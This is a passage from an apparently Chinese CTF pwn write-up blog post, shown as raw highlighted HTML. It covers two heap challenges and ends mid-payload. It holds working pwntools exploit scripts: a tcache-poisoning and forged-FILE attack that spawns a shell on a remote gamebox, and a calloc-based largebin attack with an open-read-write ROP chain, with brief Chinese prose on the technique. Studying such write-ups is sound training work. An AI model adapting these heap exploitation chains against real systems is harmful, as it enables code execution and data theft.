class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;gamebox.yunyansec.com&quot;</span>, <span class="hljs-number">32121</span>)<br><span class="hljs-comment">#p = process(&quot;./heap&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;size:\n&quot;</span>,stre(size))<br>    sea(<span class="hljs-string">b&quot;context:\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>():<br>    sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">3</span>))<br><br>add(<span class="hljs-number">0xF8</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x20</span>)<br>dele()<br><br>show()<br>rel()<br>heap_base = u64(reu(<span class="hljs-string">b&quot;\n&quot;</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x2a0</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br>key = heap_base &gt;&gt; (<span class="hljs-number">4</span>*<span class="hljs-number">3</span>)<br>ph(key,<span class="hljs-string">&quot;key&quot;</span>)<br><br>dele()<br>show()<br>dele()<br>show()<br>dele()<br><br>add(<span class="hljs-number">0xC8</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0xB8</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0xA8</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0x98</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0x78</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br><br>fake_addr = (heap_base+<span class="hljs-number">0x10</span>) ^ key<br>add(<span class="hljs-number">0xF8</span>,p64(fake_addr))<br>add(<span class="hljs-number">0xF8</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">0xF8</span>,p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">1</span> + p64(<span class="hljs-number">0x1000100000000</span>) + p64(<span class="hljs-number">0x1000100010001</span>) + p64(<span class="hljs-number">0x100000000</span>) + p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x7000000000000</span>))<br><br>dele()<br>add(<span class="hljs-number">0xE8</span>,p64(<span class="hljs-number">0</span>))<br><br>dele()<br>show()<br>dele()<br>show()<br>dele()<br>show()<br>dele()<br><br>add(<span class="hljs-number">0xE8</span>,p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">1</span> + p64(<span class="hljs-number">0x1000100000000</span>) + p64(<span class="hljs-number">0x1000100010001</span>) + p64(<span class="hljs-number">0x100000000</span>) + p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x7000000000000</span>))<br>add(<span class="hljs-number">0xF8</span>,p64(<span class="hljs-number">0</span>))<br><br>show()<br><br>rel()<br>libc_base = raddr64() - <span class="hljs-number">0x203b20</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br><br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]<br>io_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">0xC8</span>,<span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">0x8</span>)<br><br>dele()<br>show()<br>dele()<br>show()<br>dele()<br>show()<br>dele()<br><br>fake_addr = (IO_list_all) ^ key<br>add(<span class="hljs-number">0xC8</span>,p64(fake_addr))<br>fakeio1 = p32(<span class="hljs-number">0xfffff7f5</span>) + <span class="hljs-string">b&quot;;sh\x00&quot;</span> + p64(<span class="hljs-number">0x0</span>)<br>fakeio1+= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fakeio1+= p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>fakeio1+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x70</span> + p64(heap_base + <span class="hljs-number">0x500</span>)<br>fakeio1+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span><br>add(<span class="hljs-number">0xC8</span>,fakeio1)<br>add(<span class="hljs-number">0xC8</span>,p64(heap_base + <span class="hljs-number">0x3a0</span>))<br>fakeio2 = p64(<span class="hljs-number">0</span>) + p64(io_wfile_jumps)<br>fakeio2+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x78</span><br>add(<span class="hljs-number">0xB8</span>,fakeio2)<br>fakeio3 = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x68</span><br>add(<span class="hljs-number">0xA8</span>,fakeio3)<br>fakeio4 = p64(heap_base + <span class="hljs-number">0x600</span> ) + p64(<span class="hljs-number">0</span>)<br>fakeio4+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x78</span> + p64(sys_addr)<br>add(<span class="hljs-number">0x98</span>,fakeio4)<br><br>sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">6</span>))<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="small-stmashing"><a href="#small-stmashing" class="headerlink" title="small stmashing"></a><strong>small stmashing</strong></h3><p>​check:</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732429573460.png"></p><p>​沙盒：</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732430033359.png"></p><p>​NX保护开启，RELRO半开。</p><p>​漏洞点：</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732429645955.png"></p><p>​存在uaf漏洞。</p><p>​思路：</p><p>​我们最多可以持有33个堆块，我们只能持有0x78到0x3F8之间的堆块。</p><p>​add函数使用了calloc，该函数的特点就是不会从tcachebins中获取堆块。</p><p>​我们先通过9次申请0x288然后再释放，此时会有unsortbins出现，我们可以同时获得堆基地址（add函数会输出堆地址）和libc基地址。</p><p>​题目的本意应该是要我们使用smallbin中的attack，但是我们可以非常极限的通过大量的堆块来完成largebin attack（因为选择5有一个可选栈溢出，通过largebin attack到0x4040C0可以获得大量的输入来构造ORW）。</p><p>​通过非常规方法构造largebin attack非常麻烦。</p><p>​1.你得先构造两个0x500~0x530的largebin范围的unsortbin，和一个至少小于0x500的unsortbin，此时他们都不是释放状态。</p><p>​2.此时先释放0x520的块到unsorbin中，然后释放小于0x500的块到unsortbin中，申请一个和你组成unsortbin堆块大小无关的堆块（比如我是通过0x288和0x88凭凑的，就可以申请0x98），此时会从小于0x500的unsortbin分割出0x98的堆块，而0x520的堆块会被释放到largebin中。</p><p>​3.再释放0x510的堆块到unsortbin中，伪造0x520的堆块的bk_nextsize &#x3D; target - 0x20，此时再次申请0x98的堆块，我们就完成了largebin attack。</p><p>​通过5号函数的栈溢出即可完成ORW。</p><p>​exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFF9C</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;size:\n&quot;</span>,stre(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;Idx:\n&quot;</span>,stre(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">3</span>))<br>    sela(<span class="hljs-string">b&quot;Idx:\n&quot;</span>,stre(index))<br>    sea(<span class="hljs-string">b&quot;Content:\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">4</span>))<br>    sela(<span class="hljs-string">b&quot;Idx:\n&quot;</span>,stre(index))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):<br>    add(<span class="hljs-number">0x288</span>)<br>    edit(i,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x20</span>)<br><br>add(<span class="hljs-number">0x100</span>)<br>reu(<span class="hljs-string">b&quot;Ptr: &quot;</span>)<br>heap_addr = <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>ph(heap_addr,<span class="hljs-string">&quot;heap_addr&quot;</span>)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&quot;flag\x00&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):<br>    dele(i)<br><br>show(<span class="hljs-number">7</span>)<br><br>libc_base = raddr64() - <span class="hljs-number">0x1ecbe0</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br><br>openat_addr = libc_base + libc.sym[<span class="hljs-string">&quot;openat&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x15fae6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">18</span>):<br>    add(<span class="hljs-number">0x88</span>)<br><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#18</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#19</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#20</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#21</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#22</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#23</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#24</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#25</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#26</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#27</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#28</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">18</span>):<br>    dele(i)<br><br>dele(<span class="hljs-number">18</span>)<br>dele(<span class="hljs-number">19</span>)<br>dele(<span class="hljs-number">20</span>)<br>dele(<span class="hljs-number">21</span>)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#29</span><br>dele(<span class="hljs-number">23</span>)<br>dele(<span class="hljs-number">24</span>)<br><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#30</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#31</span><br>dele(<span class="hljs-number">31</span>)<br><br>edit(<span class="hljs-number">23</span>,p64(libc_base + <span class="hljs-number">0x1ed030</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4040C0</span>-<span class="hljs-number">0x20</span>))<br><br>dele(<span class="hljs-number">26</span>)<br>dele(<span class="hljs-number">27</span>)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#32</span><br><br>sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">5</span>))<br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x38</span> + 